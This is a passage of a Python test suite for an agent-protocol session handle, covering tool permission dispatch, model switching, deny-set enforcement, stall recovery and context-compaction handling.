async def test_handle_reject_tool():
    rt, _, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    await handle.reject_tool("req-8")
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["id"] == "req-8"
    assert sent["result"]["outcome"]["outcome"] == "cancelled"


@pytest.mark.asyncio
async def test_handle_set_mode():
    rt, _, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    await handle.set_mode("kirocrew-lite")
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["method"] == "session/set_mode"
    assert sent["params"]["modeId"] == "kirocrew-lite"


@pytest.mark.asyncio
async def test_handle_set_model():
    rt, _, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    wire_send = rt.send_request

    async def _send_and_answer(method, params, **kwargs):
        req_id = await wire_send(method, params, **kwargs)
        q["sA"].put_nowait(JsonRpcMessage(id=req_id, result={}))
        return req_id

    rt.send_request = _send_and_answer  # type: ignore[method-assign]
    await handle.set_model("claude-sonnet-4")
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["method"] == "session/set_model"
    assert sent["params"]["modelId"] == "claude-sonnet-4"
    assert handle.model == "claude-sonnet-4"


@pytest.mark.asyncio
async def test_handle_set_model_refusal_is_recorded_and_keeps_the_serving_model():
    """An adapter that refuses ``session/set_model`` must not read as a switch.

    Sent unawaited, the error reply was dropped by the pre-turn drain and the
    handle recorded the pick, so the dashboard showed a model that never served.
    The refusal is recorded in ``model_pin_refused`` like the config-option
    branch, so the session stays alive on its model and the caller reads it back.
    """
    rt = MagicMock()
    rt.is_alive.return_value = True
    rt.acp_backend = ACP_BACKEND_KIRO
    queue: asyncio.Queue = asyncio.Queue()
    rt.send_request = _replying_send(
        lambda _p: queue, error={"code": -32601, "message": "Method not found"}
    )
    h = AcpSessionHandle("sA", queue, rt)
    h._turn_done.set()
    h._model = "old-model"
    h._resolved_model_id = "old-model"

    await h.set_model("new-model")

    assert h.model_pin_refused == "new-model"
    assert h._model == "old-model"
    assert h._resolved_model_id == "old-model"


@pytest.mark.asyncio
async def test_handle_set_model_without_a_reply_records_the_switch(monkeypatch):
    """Silence is not a refusal: an adapter that never answers keeps the old,
    unawaited outcome, so only an explicit error reply stops the switch."""
    from kiro_crew.acp import session_handle as sh

    monkeypatch.setattr(sh, "_SET_MODEL_REPLY_TIMEOUT", 0.05)
    rt = MagicMock()
    rt.is_alive.return_value = True
    rt.acp_backend = ACP_BACKEND_KIRO
    rt.send_request = AsyncMock(return_value=1)
    h = AcpSessionHandle("sA", asyncio.Queue(), rt)
    h._turn_done.set()

    await h.set_model("new-model")

    assert h._model == "new-model"
    assert h._resolved_model_id == "new-model"


@pytest.mark.asyncio
async def test_refused_served_default_switch_does_not_fail_a_kiro_session_start():
    """``ensure_served_default`` runs right after session/new succeeded, so a
    refused switch leaves the session on its default instead of raising."""
    rt = MagicMock()
    rt.is_alive.return_value = True
    rt.acp_backend = ACP_BACKEND_KIRO
    queue: asyncio.Queue = asyncio.Queue()
    rt.send_request = _replying_send(
        lambda _p: queue, error={"code": -32603, "message": "model unavailable"}
    )
    h = AcpSessionHandle("sA", queue, rt)
    h._turn_done.set()
    h.store_session_config(
        {
            "models": {
                "currentModelId": "auto",
                "availableModels": [{"modelId": "gpt-5.6-sol"}],
            }
        }
    )

    await h.ensure_served_default()  # must not raise

    rt.send_request.assert_awaited_once()
    assert h.served_model == "auto"
    assert h.model == ""


# ── send_response / send_error ──


@pytest.mark.asyncio
async def test_send_response_writes_json():
    rt, _, proc = _make_runtime()
    await rt.send_response("req-42", {"ok": True})
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["id"] == "req-42"
    assert sent["result"] == {"ok": True}
    assert "error" not in sent


@pytest.mark.asyncio
async def test_send_error_writes_json():
    rt, _, proc = _make_runtime()
    await rt.send_error("req-99", -32601, "Method not found")
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["id"] == "req-99"
    assert sent["error"]["code"] == -32601
    assert sent["error"]["message"] == "Method not found"


@pytest.mark.asyncio
async def test_send_response_on_dead_runtime_raises():
    rt, _, _ = _make_runtime()
    rt._dead = True
    with pytest.raises(AcpRuntimeDead):
        await rt.send_response("x", {})


@pytest.mark.asyncio
async def test_send_error_on_dead_runtime_raises():
    rt, _, _ = _make_runtime()
    rt._dead = True
    with pytest.raises(AcpRuntimeDead):
        await rt.send_error("x", -1, "err")


# ── unregister_session cleans routed_requests ──


@pytest.mark.asyncio
async def test_unregister_session_cleans_routed_requests():
    rt, _, _ = _make_runtime()
    _register(rt, "sA")
    rt._routed_requests[10] = "sA"
    rt._routed_requests[11] = "sA"
    rt._routed_requests[12] = "sB"  # different session
    rt.unregister_session("sA")
    assert "sA" not in rt._session_queues
    assert 10 not in rt._routed_requests
    assert 11 not in rt._routed_requests
    assert 12 in rt._routed_requests  # sB untouched


# ── is_alive ──


@pytest.mark.asyncio
async def test_is_alive_true():
    rt, _, proc = _make_runtime()
    proc.returncode = None
    assert rt.is_alive() is True


@pytest.mark.asyncio
async def test_is_alive_false_when_dead():
    rt, _, _ = _make_runtime()
    rt._dead = True
    assert rt.is_alive() is False


@pytest.mark.asyncio
async def test_is_alive_false_when_no_process():
    rt, _, _ = _make_runtime()
    rt._process = None
    assert rt.is_alive() is False


# ── _dispatch_events: notification kind branches ──


@pytest.mark.asyncio
async def test_dispatch_permission_request():
    """Permission request notification yields EVENT_PERMISSION_REQUEST.

    Uses kiro-cli's REAL payload shape: the tool info is nested under
    ``params["toolCall"]`` (title/kind/toolCallId), NOT flat under ``params``.
    A prior ``tool_call`` update (kind="execute") seeds the trusted shell cache
    so the permission event resolves ``is_shell=True`` — the signal chat_runner's
    trust-mode gate needs to waive the tool-name length cap on shell commands.
    """
    from kiro_crew.acp.types import (
        EVENT_PERMISSION_REQUEST,
        METHOD_REQUEST_PERMISSION,
        METHOD_SESSION_UPDATE,
    )

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        # First a tool_call update (seeds the trusted is_shell cache).
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call",
                        "toolCallId": "tcP",
                        "title": "git status",
                        "kind": "execute",
                    },
                },
            },
        )
        # Then the permission request in kiro's real toolCall-nested shape.
        _feed(
            reader,
            {
                "id": 5001,
                "method": METHOD_REQUEST_PERMISSION,
                "params": {
                    "sessionId": "sA",
                    "toolCall": {"title": "git status", "kind": "execute", "toolCallId": "tcP"},
                    "options": [
                        {"optionId": "allow_once", "name": "Allow once", "kind": "allow_once"},
                        {
                            "optionId": "allow_always",
                            "name": "Allow always",
                            "kind": "allow_always",
                        },
                    ],
                },
            },
        )
        # Then complete the turn
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        perm = [e for e in events if e.kind == EVENT_PERMISSION_REQUEST]
        assert len(perm) == 1
        assert perm[0].title == "git status"
        assert perm[0].request_id == 5001
        assert perm[0].tool_kind == "execute"
        assert perm[0].tool_call_id == "tcP"
        # The critical regression guard: is_shell must be True so the trust-mode
        # gate does not reject the long shell command title on the length cap.
        assert perm[0].is_shell is True
        # Advertised optionIds recorded so approve/reject echo the exact ids.
        assert handle._permission_options[5001] == {"once": "allow_once", "always": "allow_always"}
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_a_spec_disabled_tool_is_refused_before_the_event_is_yielded():
    """The deny set the mirror's projection returned is enforced in the dispatch loop.

    Unit-testing ``_deny_spec_disabled_tool`` alone would pass on a loop that never
    called it, and an unwired restriction on a host that approves its own tools is
    the whole defect. So this drives the real loop: the ``tool_call`` frame seeds the
    trusted identity cache, the approval arrives, and NOTHING is yielded -- a
    consumer that auto-approves on hooks or trust must not get the chance, and a
    human must not be asked to re-decide what the agent spec settled.
    """
    from kiro_crew.acp.types import (
        EVENT_PERMISSION_REQUEST,
        METHOD_REQUEST_PERMISSION,
        METHOD_SESSION_UPDATE,
    )

    rt, reader, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # What AcpRuntime sets from the projection on a mirrored host.
    handle.spec_denied_tools = frozenset({("kirocrew-core", "spawn_run")})
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        # The adapter's own resolution of what will run -- the one identity channel
        # the model cannot reach.
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call",
                        "toolCallId": "tcD",
                        "title": "mcp.kirocrew-core.spawn_run",
                        "kind": "execute",
                        "rawInput": {"server": "kirocrew-core", "tool": "spawn_run"},
                    },
                },
            },
        )
        _feed(
            reader,
            {
                "id": 6001,
                "method": METHOD_REQUEST_PERMISSION,
                "params": {
                    "sessionId": "sA",
                    "toolCall": {"kind": "execute", "toolCallId": "tcD"},
                    "options": [
                        {"optionId": "allow_once", "name": "Allow", "kind": "allow_once"},
                        {"optionId": "cancel", "name": "Cancel", "kind": "reject_once"},
                    ],
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert [e for e in events if e.kind == EVENT_PERMISSION_REQUEST] == []
        answered = [
            json.loads(call.args[0].decode())
            for call in proc.stdin.write.call_args_list
            if b'"id": 6001' in call.args[0] or b'"id":6001' in call.args[0]
        ]
        assert answered, "the request must be ANSWERED, never dropped -- a dropped one hangs"
        assert answered[-1]["result"]["outcome"] == {
            "outcome": "selected",
            "optionId": "cancel",
        }
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_a_tool_the_deny_set_does_not_name_still_reaches_the_consumer():
    """The refusal is narrow: a set that names another tool changes nothing."""
    from kiro_crew.acp.types import (
        EVENT_PERMISSION_REQUEST,
        METHOD_REQUEST_PERMISSION,
        METHOD_SESSION_UPDATE,
    )

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.spec_denied_tools = frozenset({("kirocrew-core", "spawn_run")})
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call",
                        "toolCallId": "tcE",
                        "title": "mcp.kirocrew-core.send_message",
                        "kind": "execute",
                        "rawInput": {"server": "kirocrew-core", "tool": "send_message"},
                    },
                },
            },
        )
        _feed(
            reader,
            {
                "id": 6002,
                "method": METHOD_REQUEST_PERMISSION,
                "params": {
                    "sessionId": "sA",
                    "toolCall": {"kind": "execute", "toolCallId": "tcE"},
                    "options": [
                        {"optionId": "allow_once", "name": "Allow", "kind": "allow_once"},
                        {"optionId": "cancel", "name": "Cancel", "kind": "reject_once"},
                    ],
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        perm = [e for e in events if e.kind == EVENT_PERMISSION_REQUEST]
        assert len(perm) == 1
        assert perm[0].request_id == 6002
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_an_unidentifiable_mcp_approval_never_reaches_the_consumer():
    """The second refusal is wired into the dispatch loop, not merely callable.

    A standalone MCP approval carries no correlated ``tool_call`` frame, so the
    handle cannot check it against the deny set. It must be ANSWERED here rather than
    yielded: the consumer auto-approves by hook glob and in trust mode, and this
    session's spec switched a tool off.
    """
    from kiro_crew.acp.types import (
        EVENT_PERMISSION_REQUEST,
        METHOD_REQUEST_PERMISSION,
    )

    rt, reader, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.spec_denied_tools = frozenset({("kirocrew-core", "spawn_run")})
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        # No tool_call frame first: this is codex's standalone shape, which still
        # carries the MCP marker.
        _feed(
            reader,
            {
                "id": 6003,
                "method": METHOD_REQUEST_PERMISSION,
                "params": {
                    "sessionId": "sA",
                    "toolCall": {"kind": "execute", "toolCallId": "tcUnknown"},
                    "_meta": {"is_mcp_tool_approval": True},
                    "options": [
                        {"optionId": "allow_once", "name": "Allow", "kind": "allow_once"},
                        {"optionId": "cancel", "name": "Cancel", "kind": "reject_once"},
                    ],
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        assert [e for e in events if e.kind == EVENT_PERMISSION_REQUEST] == []
        answered = [
            json.loads(call.args[0].decode())
            for call in proc.stdin.write.call_args_list
            if b'"id": 6003' in call.args[0] or b'"id":6003' in call.args[0]
        ]
        assert answered, "the request must be ANSWERED, never dropped -- a dropped one hangs"
        assert answered[-1]["result"]["outcome"]["optionId"] == "cancel"
    finally:
        await _stop_reader(task)


def test_both_deny_set_refusals_run_at_the_handles_one_answering_site():
    """Structural: ``AcpClient`` splits these across two sites because it HAS two.

    The handle has one, so both belong on it. A refusal that exists but is not called
    from the loop is a restriction nothing enforces, and the behavioural tests above
    each cover only their own branch.
    """
    import inspect

    body = inspect.getsource(AcpSessionHandle._dispatch_events)
    assert "self._deny_spec_disabled_tool(" in body
    assert "self._refuse_unidentifiable_mcp_approval(" in body


@pytest.mark.asyncio
async def test_approve_tool_echoes_recorded_option():
    """approve_tool echoes the advertised optionId recorded from the request."""
    rt, _, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # Simulate build_permission_event having recorded claude-agent-acp ids.
    handle._permission_options[42] = {"once": "allow", "always": "allow_always"}
    handle._permission_gate_events[42] = _recorded_request(42)
    await handle.approve_tool(42)  # no explicit id → resolves the "once" variant
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["result"]["outcome"]["optionId"] == "allow"
    assert 42 not in handle._permission_options  # consumed on use


@pytest.mark.asyncio
async def test_reject_tool_prefers_recorded_reject_option():
    """reject_tool sends a clean 'selected' reject when one was advertised."""
    rt, _, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle._permission_options[7] = {"once": "allow", "reject": "reject"}
    await handle.reject_tool(7)
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["result"]["outcome"]["outcome"] == "selected"
    assert sent["result"]["outcome"]["optionId"] == "reject"


@pytest.mark.asyncio
async def test_dispatch_tool_call_and_result():
    """Tool call + tool result notifications yield correct events."""
    from kiro_crew.acp.types import EVENT_TOOL_CALL, EVENT_TOOL_RESULT

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        # Tool call
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call",
                        "toolCallId": "tc1",
                        "title": "bash",
                        "kind": "shell",
                    },
                },
            },
        )
        # Tool result (real kiro 2.10.0 shape: nested block.content.text)
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call_update",
                        "toolCallId": "tc1",
                        "content": [{"content": {"type": "text", "text": "output here"}}],
                    },
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")

        tc = [e for e in events if e.kind == EVENT_TOOL_CALL]
        tr = [e for e in events if e.kind == EVENT_TOOL_RESULT]
        assert len(tc) == 1 and tc[0].tool_call_id == "tc1" and tc[0].title == "bash"
        assert len(tr) == 1 and tr[0].tool_output == "output here"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_tool_stall_cancels_session_not_runtime(monkeypatch):
    """A dispatched tool that goes silent must be recovered by a session-scoped
    session/cancel (so co-tenant sessions on the shared runtime survive), NOT by
    killing the runtime process. The turn ends with stop_reason 'tool_stall'."""
    from kiro_crew.acp.session_handle import WatchdogSettings
    from kiro_crew.acp.types import EVENT_COMPLETE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    rt.send_notification = AsyncMock()  # type: ignore[method-assign]
    handle = AcpSessionHandle(
        "sA",
        q["sA"],
        rt,
        watchdog=WatchdogSettings(check_after_secs=0.01, tool_stall_suspect_secs=0.05),
    )
    handle._tool_dispatched = True  # a tool was dispatched this turn
    handle._stale_eligible = False  # the stale-turn check must NOT be what fires

    # Queue that always times out (empty forever), advancing the wall clock a
    # little each poll so the stall idle window is crossed deterministically.
    class _SilentQueue:
        async def get(self):
            await asyncio.sleep(0.06)
            raise asyncio.TimeoutError

        def qsize(self) -> int:
            return 0  # always empty; TOCTOU guard sees no new frames

    handle._queue = _SilentQueue()  # type: ignore[assignment]

    events = []
    async for ev in handle._dispatch_events(req_id=1, timeout=30.0):
        events.append(ev)

    # Recovery was a session-scoped session/cancel for THIS sessionId — the
    # runtime process is never killed (no killpg/SIGKILL on the stall path).
    rt.send_notification.assert_awaited_once()
    assert rt.send_notification.call_args.args[0] == "session/cancel"
    assert rt.send_notification.call_args.args[1]["sessionId"] == "sA"
    # Turn ends cleanly, flagged as a stall.
    assert events and events[-1].kind == EVENT_COMPLETE
    assert events[-1].stop_reason == "error: tool stall"


@pytest.mark.asyncio
async def test_tool_stall_recovery_completes_even_if_cancel_fails(monkeypatch):
    """If session/cancel raises or times out (an unresponsive runtime is likely
    right after a stall), the watchdog must still complete the turn — the
    bounded wait_for + except must not let recovery hang or bubble."""
    from kiro_crew.acp.session_handle import WatchdogSettings
    from kiro_crew.acp.types import EVENT_COMPLETE

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle(
        "sA",
        q["sA"],
        rt,
        watchdog=WatchdogSettings(check_after_secs=0.01, tool_stall_suspect_secs=0.05),
    )
    handle._tool_dispatched = True
    handle._stale_eligible = False
    # cancel() fails (stands in for the wait_for timeout path — both raise into
    # the same except Exception).
    handle.cancel = AsyncMock(side_effect=RuntimeError("runtime unresponsive"))  # type: ignore[method-assign]

    class _SilentQueue:
        async def get(self):
            await asyncio.sleep(0.06)
            raise asyncio.TimeoutError

        def qsize(self) -> int:
            return 0  # always empty; TOCTOU guard sees no new frames

    handle._queue = _SilentQueue()  # type: ignore[assignment]

    events = []
    async for ev in handle._dispatch_events(req_id=1, timeout=30.0):
        events.append(ev)

    handle.cancel.assert_awaited_once()
    assert events and events[-1].kind == EVENT_COMPLETE
    assert events[-1].stop_reason == "error: tool stall"


@pytest.mark.asyncio
async def test_dispatch_thinking_chunk():
    """agent_thought_chunk yields EVENT_THINKING_CHUNK."""
    from kiro_crew.acp.types import EVENT_THINKING_CHUNK

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "agent_thought_chunk", "text": "thinking..."},
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        think = [e for e in events if e.kind == EVENT_THINKING_CHUNK]
        assert len(think) == 1 and think[0].text == "thinking..."
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_compaction_and_clear():
    """Compaction and clear notifications yield appropriate events."""
    from kiro_crew.acp.types import (
        EVENT_CLEAR_STATUS,
        EVENT_COMPACTION_STATUS,
        METHOD_CLEAR_STATUS,
        METHOD_COMPACTION_STATUS,
    )

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        events = []

        async def drive():
            async for ev in handle.prompt("hi", timeout=3.0):
                events.append(ev)

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_COMPACTION_STATUS,
                "params": {
                    "sessionId": "sA",
                    "status": {"type": "compacting"},
                    "summary": "50%",
                },
            },
        )
        _feed(reader, {"method": METHOD_CLEAR_STATUS, "params": {"sessionId": "sA"}})
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        comp = [e for e in events if e.kind == EVENT_COMPACTION_STATUS]
        clr = [e for e in events if e.kind == EVENT_CLEAR_STATUS]
        assert len(comp) == 1 and comp[0].text == "compacting"
        assert len(clr) == 1
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_dispatch_compaction_completed_resets_context_stats():
    """A completed compaction in the prompt dispatch loop must drop the stale
    context-usage counts (regression: the meter froze at the pre-compaction
    value because context_tokens_from_usage=True blocked fresh metadata)."""
    from kiro_crew.acp.types import METHOD_COMPACTION_STATUS, AcpPromptStats

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=75.0,
        context_used_tokens=150_000,
        context_window_tokens=200_000,
        context_tokens_from_usage=True,
    )
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ev in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "method": METHOD_COMPACTION_STATUS,
                "params": {
                    "sessionId": "sA",
                    "status": {"type": "completed"},
                    "summary": "squeezed",
                },
            },
        )
        _feed(reader, {"id": req_id, "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
        stats = handle.last_prompt_stats
        assert stats.context_pct == 0.0
        assert stats.context_used_tokens == 0
        assert stats.context_tokens_from_usage is False
        assert stats.context_window_tokens == 200_000  # model unchanged
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_wait_for_compaction_drain_path_resets_context_stats():
    """The async-after-end_turn drain path in wait_for_compaction bypasses the
    prompt dispatch loop, so it must drop the stale counts itself."""
    from kiro_crew.acp.types import (
        METHOD_COMPACTION_STATUS,
        AcpPromptStats,
        JsonRpcMessage,
    )

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=75.0,
        context_used_tokens=150_000,
        context_window_tokens=200_000,
        context_tokens_from_usage=True,
    )
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={"sessionId": "sA", "status": {"type": "completed"}, "summary": "ok"},
        )
    )
    # Poison the queue behind the status so the post-compaction metadata grace
    # drain exits immediately instead of sleeping out its window.
    q["sA"].put_nowait(None)

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "completed"
    stats = handle.last_prompt_stats
    assert stats.context_pct == 0.0
    assert stats.context_used_tokens == 0
    assert stats.context_tokens_from_usage is False
    assert stats.context_window_tokens == 200_000


@pytest.mark.asyncio
@pytest.mark.parametrize("summary", ["", None])
async def test_wait_for_compaction_drain_failed_with_empty_summary_carries_the_reason(summary):
    """kiro-cli's ``summary`` is empty on failure, so the drain path carries the
    reason the payload names -- read by the same extractor the dispatch loop
    uses -- and a manual /compact names its cause the way auto-compaction does."""
    from kiro_crew.acp.types import METHOD_COMPACTION_STATUS, JsonRpcMessage

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={
                "sessionId": "sA",
                "status": {"type": "failed", "error": "context window exceeded"},
                "summary": summary,
            },
        )
    )

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result == {"type": "failed", "summary": "context window exceeded"}


@pytest.mark.asyncio
async def test_wait_for_compaction_drain_failed_without_a_reason_reports_the_fallback():
    """No summary and no reason-bearing key: the drain result carries the
    extractor's own generic text, the same line the streaming notice shows."""
    from kiro_crew.acp.transport_errors import compaction_failure_detail
    from kiro_crew.acp.types import METHOD_COMPACTION_STATUS, JsonRpcMessage

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    params = {"sessionId": "sA", "status": {"type": "failed"}, "summary": ""}
    q["sA"].put_nowait(JsonRpcMessage(method=METHOD_COMPACTION_STATUS, params=params))

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "failed"
    assert result["summary"] == compaction_failure_detail(params)
    assert result["summary"].startswith("no reason reported by the agent")


@pytest.mark.asyncio
async def test_wait_for_compaction_drain_failed_with_a_credential_shaped_summary_is_redacted():
    """A backend-echoed failure summary is LLM-influenced text, so the drain
    result carries it scrubbed -- the same ``redact_text`` the client wait path
    applies -- before the dashboard or a channel mirror shows it."""
    from kiro_crew.acp.types import METHOD_COMPACTION_STATUS, JsonRpcMessage

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={
                "sessionId": "sA",
                "status": {"type": "failed"},
                "summary": "backend error: key AKIAIOSFODNN7EXAMPLE rejected",
            },
        )
    )

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "failed"
    assert "AKIAIOSFODNN7EXAMPLE" not in result["summary"]
    assert "[REDACTED: credential]" in result["summary"]


@pytest.mark.asyncio
async def test_wait_for_compaction_drain_applies_post_compaction_metadata():
    """kiro emits the real post-compaction pct ~1s after the completed status;
    the drain path must capture it and derive against the KEPT served window."""
    from kiro_crew.acp.types import (
        METHOD_COMPACTION_STATUS,
        AcpPromptStats,
        JsonRpcMessage,
    )

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=90.0,
        context_used_tokens=900_000,
        context_window_tokens=1_000_000,  # served window (differs from registry)
        context_tokens_from_usage=True,
    )
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={"sessionId": "sA", "status": {"type": "completed"}, "summary": "ok"},
        )
    )
    q["sA"].put_nowait(
        JsonRpcMessage(
            method="_kiro.dev/metadata",
            params={"sessionId": "sA", "contextUsagePercentage": 5.0},
        )
    )

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "completed"
    stats = handle.last_prompt_stats
    assert stats.context_pct == 5.0
    assert stats.context_window_tokens == 1_000_000
    assert stats.context_used_tokens == 50_000


@pytest.mark.asyncio
async def test_post_compaction_drain_requeues_frames_before_poison():
    """Death during the grace drain: buffered frames must be re-queued BEFORE
    the poison sentinel, or recovery would see death first and strand them."""
    from kiro_crew.acp.types import (
        METHOD_COMPACTION_STATUS,
        AcpPromptStats,
        JsonRpcMessage,
    )

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
        context_pct=75.0,
        context_used_tokens=150_000,
        context_window_tokens=200_000,
        context_tokens_from_usage=True,
    )
    stray = JsonRpcMessage(method="session/update", params={"sessionId": "sA", "update": {}})
    q["sA"].put_nowait(
        JsonRpcMessage(
            method=METHOD_COMPACTION_STATUS,
            params={"sessionId": "sA", "status": {"type": "completed"}, "summary": "ok"},
        )
    )
    q["sA"].put_nowait(stray)
    q["sA"].put_nowait(None)

    result = await handle.wait_for_compaction(timeout=3.0)

    assert result["type"] == "completed"
    # Order restored: the stray frame first, the poison sentinel last.
    assert q["sA"].get_nowait() is stray
    assert q["sA"].get_nowait() is None


@pytest.mark.asyncio
async def test_outer_buffered_frame_restored_before_poison_from_nested_drain():
    """A frame buffered by wait_for_compaction ITSELF (before the completed
    status) must also be restored ahead of a poison consumed by the NESTED
    grace drain — separate buffers restored at different times would park the
    frame behind the death sentinel and its consumer would see AcpProcessDied
    despite a completed command."""
    from kiro_crew.acp.types import (
        METHOD_COMPACTION_STATUS,
        AcpPromptStats,
        JsonRpcMessage,
    )

    rt, _reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle.last_prompt_stats = AcpPromptStats(
